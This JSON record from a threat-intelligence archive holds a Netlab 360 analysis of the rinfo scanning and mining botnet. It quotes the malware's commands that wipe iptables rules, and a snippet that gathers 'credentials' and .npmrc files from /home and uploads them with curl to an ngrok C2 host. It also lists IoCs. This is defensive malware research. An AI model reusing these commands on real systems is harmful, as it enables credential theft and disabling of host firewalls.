{
    "id": "51ce76ff-b508-45b9-8cc5-ed9a0a2daea7",
    "created_at": "2023-01-12T15:10:08.311105Z",
    "updated_at": "2025-03-27T02:09:55.035414Z",
    "deleted_at": null,
    "sha1_hash": "1549cc7125bb056435345d7902c576b860553a78",
    "title": "2021-02-10 - Rinfo Is Making A Comeback and Is Scanning and Mining in Full Speed",
    "authors": "",
    "file_creation_date": "2022-05-29T01:36:42Z",
    "file_modification_date": "2022-05-29T01:36:42Z",
    "file_size": 306286,
    "plain_text": "# Rinfo Is Making A Comeback and Is Scanning and Mining in Full Speed\n\n**[blog.netlab.360.com/rinfo-is-making-a-comeback-and-is-scanning-and-mining-in-full-speed/](https://blog.netlab.360.com/rinfo-is-making-a-comeback-and-is-scanning-and-mining-in-full-speed/)**\n\nLIU Ya February 10, 2021\n\n10 February 2021 / [rinfo](https://blog.netlab.360.com/tag/rinfo/)\n\n## Overview\n\nIn 2018 we blogged about a scanning&mining botnet family that uses ngrok.io to propagate\n[samples: \"A New Mining Botnet Blends Its C2s into ngrok Service](https://blog.netlab.360.com/a-new-mining-botnet-blends-its-c2s-into-ngrok-service/)\n\n\", and since mid-October 2020, our BotMon system started to see a new variant of this family\nthat is active again and continues to this day. Compared to the last time, this time it is more\naggressive, and as of February 6, 2021, our Anglerfish honeypot has captured 11,864\nscanner samples, 1,754 miner samples, and 3,232 ngrok.io C2 domains. The sample\ncaptures can be found in the capture log below.\n\n\n-----\n\nThis new variant is still spreading, and here are some key features：\n\n1. The overall structure of the family has not changed, still consists of scanning and\n\nmining modules, the purpose of scanning is to form a mining botnet.\n2. The new ones and the old ones are pretty much same origin, the function has changed\n\nslightly.\n3. The new version still relies on ngrok.io to distribute samples and report results.\n4. The ports and services that the bot is going after have changed, with Apache CouchDB\n\nand MODX removed while 3 new ones of Mongo, Confluence and vBulletin added.\n5. Same as the old ones, the scanner module is only responsible for detecting open ports\n\nand services, with no exploit functions integrated.\n\n## Sample Comparison Analysis\n\nThe family consists of two core modules: the scanner, and the miner, both written in bash\nscript. We named this family rinfo because the scanner module uses a file starting with\n\"/tmp/rinfo\" to save the results in both versions. We found no code related to downloading\nand executing the miner module in the scanner module, and vice versa, there is no code\ninvolving the scanner module in the miner module, and the only clue to relate them is the\nsame loader IP and the same attacked port. Combining the samples, we speculate that\nscanner is the starting module, and after a target is located, the attacker can choose to either\nimplant the scanner module or drop the miner module. Theoretically, the attacker may also\nimplant other functional modules, we will keep an eye on this and disclose any further\nfindings in time.\n\n### scanner module\n\nThe scanner module analysis is based on the sample\nmd5=01199e3d63c5211b902d18a7817a6997. Like the old version, the job is performed by\nzmap, jq and zgrab. The scanner module will download and execute these binaries, and then\nreport the results. The entire scanner module is shown in the following figure.\n\n\n-----\n\nCompared with the old version (md5=072922760ec200ccce83ac5ce20c46ca), the biggest\nchange in the new version is the target scan ports and services. The old version went after\nthese ports and services:\n```\nTCP 6379，Redis\nTCP 2375，Docker client version 1.16\nTCP 80/8080，Jenkins/Drupal/MODX\nTCP 5984，Apache CouchDB\n\n```\nThe new version no longer scans port 5984, but adds TCP ports of 6380 and 443. In terms of\nscanned services, Apache CouchDB and MODX have been replaced by Mongo, Confluence\nand vBulletin, as can be seen from below:\n```\nTCP 6380, Redis\nTCP 2375, Docker client version 1.16\nTCP 80/443/8080, Jenkins/Mongo/Drupal/Confluence/vBulletin\n\n```\nAnother change is the pattern of the url for reporting scan results. The old version url is like\nthis:\n```\nhxxp://cc8ef76b.ngrok.io/z?\nr=40ddb986122e221e08092943e5faa2ed&i=2a6da41fcf36d873dde9ed0040fcf99ba59f579c3723bb178\n\n```\nThe new version has changed to 2 urls, with the value of the i parameter of the url becoming\nshorter:\n```\nhxxp://0c9cbf209b1c.ngrok.io/z?\nr=0cf45361e2393cb0dc2488fd6db89cba&i=f05e89c39363f65c&x=${excode} \nhxxp://b78cf6364fd3.ngrok.io/z?\nr=0cf45361e2393cb0dc2488fd6db89cba&i=f05e89c39363f65c&x=${excode}\n\n```\nIt should be noted that the subdomain of ngrok.io in all the above URLs is not fixed, and its\nvalue is not the same in different scanner samples, which explains why the number of\n[scanner samples is more than 10 thousands. As we mentioned in previous blog the goal of](https://blog.netlab.360.com/a-new-mining-botnet-blends-its-c2s-into-ngrok-service/)\n\n\n-----\n\nall these probably is to increase the difficulty of defense.\n\nThe third change is the setting of the target netblocks. In the old version it was specified in\nthe form of bash shell array, while in the new version it has changed to a single value.\n```\n# old\nIPR=\"13.238.160.0/19 52.33.224.0/19 194.42.160.0/19 37.123.128.0/19 146.88.0.0/19\n39.97.32.0/19 117.73.160.0/19 58.119.224.0/19 118.89.224.0/19 211.109.32.0/19\n211.186.192.0/19 58.123.32.0/19 58.229.224.0/19 52.123.32.0/19 52.244.192.0/19\n52.250.224.0/19 63.34.192.0/19 3.114.224.0/19\"\n# new\nIPR=\"94.130.96.0/19\"\n\n```\nWhile the IPR value varifies across scanner samples, the mask is always 19 bits. As a\nsummary, there have been 700+ networks checked from scanner samples.\n\n## miner module\n\nThe analysis of the miner module is based on the sample\nMD5=1d74fd8d25fa3750405d8ba8d224d084. Similar to the scanner module, the miner\nmodule is just a bash script, and the specific mining behavior is achieved by downloading\nand executing the binary miner programs.\n\nCompared with the old version, the new version of miner module has not changed much, and\nthe usage pattern for ngrok.io is the same, the are a few minor differences though:\n\n1. The new version no longer downloads and runs the fc program, and the miner program\n\nintegrates new wallet addresses.\n2. The new version removes the ability to infect local .js files.\n3. iptables is configured to remove various network restrictions.\n4. The function of stealing credentials is added.\n\nThe newly added iptables commands are as follows:\n```\niptables -P INPUT ACCEPT >/dev/null 2>&1\niptables -P FORWARD ACCEPT >/dev/null 2>&1\niptables -P OUTPUT ACCEPT >/dev/null 2>&1\niptables -t nat -F >/dev/null 2>&1\niptables -t mangle -F >/dev/null 2>&1\niptables -F >/dev/null 2>&1\niptables -X >/dev/null 2>&1\n\n```\nThe infected .js code at the end of the old version is replaced by the following code to steal\ncredentials:\n\n\n-----\n\n```\nfind /home maxdepth 5 type f name credentials 2>/dev/null | xargs I % sh c\n'echo :::%; cat %'>>$CFG 2>/dev/null\nfind /home -maxdepth 5 -type f -name '.npmrc' 2>/dev/null | xargs -I % sh -c 'echo\n:::%; cat %'>>$CFG 2>/dev/null\nif [ -s $CFG ]; then\n curl -s -F file=@$CFG \"$HOST/c?r=${RIP}\" >/dev/null 2>&1\nrm -rf $CFG\n\n```\nThis code looks for and uploads the credentials and .npmrc files in /home and its\nsubdirectories.\n\nAs in the old version, the download server is accessed throughout the miner module via a\n$HOST variable, which points to a temporary ngrok.io domain. This is where the miner\nmodule differs from the scanner module, which assigns a different ngrok subdomain to each\nurl.\n\n## Conclusion\n\nThe new version of rinfo has no major changes compared to the previous one, both in terms\nof module structure and approach, so we guess that the same people are behind it. From the\nsamples we captured, the purpose of the new version of rinfo is still to form a mining botnet,\nwhich may be related to the recent bitcoin price increase.\n\nBecause this botnet family relies heavily on ngrok.io for propagation, its frequently changing\nngrok temporary domain name makes defense difficult, we recommend detecting and\nblocking this botnet based on its url patterns.\n\n## Contact us\n\nReaders are always welcomed to reach us on twitter or email to netlab at 360 dot cn.\n\n## IoC\n\n### attacker&loader IPs\n```\n185.242.6.3\n185.159.157.20\n\n scanner modules\n01199e3d63c5211b902d18a7817a6997 http://738a39f8d49c.ngrok.io/z?\nr=0cf45361e2393cb0dc2488fd6db89cba&i=f05e89c39363f65c&x=0\n...\n\n binaries used in scanner\n\n```\n\n-----\n\n```\n1ad3216964d073dabec2b843a06042f9 zmap http://bda5861e074e.ngrok.io/d8/gmap\n8f797aef388194277307345ba1bdeb08 zgrab http://3aee228ab53a.ngrok.io/d8/zgrab\nc3461eb5b1abe7551023ef5964ca9080 jq http://1edab0651a2b.ngrok.io/d8/jq\n...\n\n```\n**report urls found in scanner modules**\n```\nhttp://0c9cbf209b1c.ngrok.io/z?\nr=0cf45361e2393cb0dc2488fd6db89cba&i=f05e89c39363f65c&x=0\nhttp://b78cf6364fd3.ngrok.io/z?\nr=0cf45361e2393cb0dc2488fd6db89cba&i=f05e89c39363f65c&x=0\n...\n\n### miner modules\n1d74fd8d25fa3750405d8ba8d224d084 http://4bfd95b92a04.ngrok.io/f/serve?\nl=j&r=99341660c472f43e8124bc255aa0571bt\n...\n\n binaries used in miner\n323c22138cc098c3d1c11b47fda3c053 CoinMiner http://bcaf48a9ab6b.ngrok.io/d8/nginx\n2b9440c2c2d27a102e2f1e2a7140b57c Doki http://bcaf48a9ab6b.ngrok.io/d8/daemon\n\n report urls found in miner modules\nhttp://522240bf9589.ngrok.io/contact?k=1\nhttp://522240bf9589.ngrok.io/contact?r=99341660c472f43e8124bc255aa0571bt&e=1\n\n miner pools&wallets\npool: xmr-eu2.nanopool.org:14444\nwallet:\n49JzXdLYqybL4a2u3hpa46WbqiYmd3xT1intPPDxzLR6hRJ81LA72tEMdgESxPnK2hEcVtom3m7ABisXShQkjz\npool:xmr-asia1.nanopool.org:14444\nwallet:49JzXdLYqybL4a2u3hpa46WbqiYmd3xT1intPPDxzLR6hRJ81LA72tEMdgESxPnK2hEcVtom3m7ABis\npool:xmr-us-east1.nanopool.org:14444\nwallet:49JzXdLYqybL4a2u3hpa46WbqiYmd3xT1intPPDxzLR6hRJ81LA72tEMdgESxPnK2hEcVtom3m7ABis\n\n## References\n\n```\n[https://blog.netlab.360.com/a-new-mining-botnet-blends-its-c2s-into-ngrok-service/](https://blog.netlab.360.com/a-new-mining-botnet-blends-its-c2s-into-ngrok-service/)\n\nhttps://www.intezer.com/blog/cloud-security/watch-your-containers-doki-infecting-dockerservers-in-the-cloud/\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-02-10 - Rinfo Is Making A Comeback and Is Scanning and Mining in Full Speed.pdf"
    ],
    "report_names": [
        "2021-02-10 - Rinfo Is Making A Comeback and Is Scanning and Mining in Full Speed.pdf"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f5bf6853-3f6e-452c-a7b7-8f81c9a27476",
            "created_at": "2023-01-06T13:46:38.677391Z",
            "updated_at": "2025-03-27T02:00:02.889755Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "MISPGALAXY:Careto",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536208,
    "ts_updated_at": 1743041395,
    "ts_creation_date": 1653788202,
    "ts_modification_date": 1653788202,
    "files": {
        "pdf": "https://archive.orkl.eu/1549cc7125bb056435345d7902c576b860553a78.pdf",
        "text": "https://archive.orkl.eu/1549cc7125bb056435345d7902c576b860553a78.txt",
        "img": "https://archive.orkl.eu/1549cc7125bb056435345d7902c576b860553a78.jpg"
    }
}